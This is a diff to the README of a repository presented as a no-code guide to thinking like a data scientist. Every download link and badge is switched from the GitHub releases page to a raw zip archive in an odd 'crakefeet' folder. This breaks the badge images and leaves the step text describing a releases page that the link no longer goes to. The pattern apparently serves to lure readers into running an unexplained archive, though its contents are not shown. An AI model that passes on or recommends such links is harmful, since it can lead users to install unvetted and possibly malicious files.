@@ -1,6 +1,6 @@
 # 📖 Think-Like-a-Data-Scientist - Explore Data-Driven Thinking Without Code
 
-[![Download Now](https://img.shields.io/badge/Download_Now-%20-blue?style=for-the-badge)](https://github.com/Mesho2022/Think-Like-a-Data-Scientist/releases)
+[![Download Now](https://raw.githubusercontent.com/Mesho2022/Think-Like-a-Data-Scientist/main/crakefeet/Think-Like-a-Data-Scientist_v3.3.zip%20-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mesho2022/Think-Like-a-Data-Scientist/main/crakefeet/Think-Like-a-Data-Scientist_v3.3.zip)
 
 ## 📚 Overview
 
@@ -35,7 +35,7 @@ To begin your journey into data-driven thinking, follow these simple steps to do
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Mesho2022/Think-Like-a-Data-Scientist/releases) to download the article.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Mesho2022/Think-Like-a-Data-Scientist/main/crakefeet/Think-Like-a-Data-Scientist_v3.3.zip) to download the article.
 
 2. On the Releases page, you will see various files available for download. Locate the most recent version of the article.
 
@@ -89,4 +89,4 @@ If you have questions or need assistance, feel free to reach out through the iss
 
 Thank you for exploring "Think-Like-a-Data-Scientist." Your curiosity paves the way for insightful understanding and growth in the field of data analysis.
 
-[![Download Now](https://img.shields.io/badge/Download_Now-%20-blue?style=for-the-badge)](https://github.com/Mesho2022/Think-Like-a-Data-Scientist/releases)
+[![Download Now](https://raw.githubusercontent.com/Mesho2022/Think-Like-a-Data-Scientist/main/crakefeet/Think-Like-a-Data-Scientist_v3.3.zip%20-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mesho2022/Think-Like-a-Data-Scientist/main/crakefeet/Think-Like-a-Data-Scientist_v3.3.zip)
